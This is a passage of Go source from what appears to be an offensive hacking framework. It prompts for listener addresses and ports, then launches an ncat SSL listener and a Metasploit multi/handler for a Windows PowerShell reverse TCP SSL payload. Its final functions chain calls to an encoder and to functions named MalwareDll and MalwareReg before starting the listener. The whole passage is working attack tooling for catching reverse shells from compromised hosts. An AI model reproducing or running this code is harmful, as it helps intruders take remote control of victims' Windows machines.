        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Println(bcolors.ORANGE + `
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|
          ` + bcolors.DARKGREEN)
        subprocess.Popen(`ncat --ssl --ssl-key /root/.africana/certs/africana-key.pem --ssl-cert /root/.africana/certs/africana-cert.pem %s`, userLport)
    case "2":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.Popen(`msfdb start; msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhostIp, userLport)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func ListenerLauncher() {
    fmt.Println()
    fmt.Print(bcolors.ENDC + `¯\_(ツ)_/¯ ` + bcolors.DARKCYAN + "🥥Do you want to launch a Listener... " + bcolors.YELLOW + "(y/n): " + bcolors.ENDC)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "y"
    }
    switch userInput {
    case "n":
        return
    case "y":
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use " + bcolors.RED + "LISTENER " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.ENDC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userInput, _ := reader.ReadString('\n')
        userInput = strings.TrimSpace(userInput)
        if userInput == "" {
            userInput = "1"
        }
        switch userInput {
        case "0":
            return
        case "1":
            ListenerTcp()
        case "2":
            ListenerHttp()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func NoiseMakers() {
    ShikataGanai    ()
    MalwareDll      ()
    ListenerLauncher()
}

func CodeBreakers() {
    ShikataGanai    ()
    MalwareReg      ()
    ListenerLauncher()
}

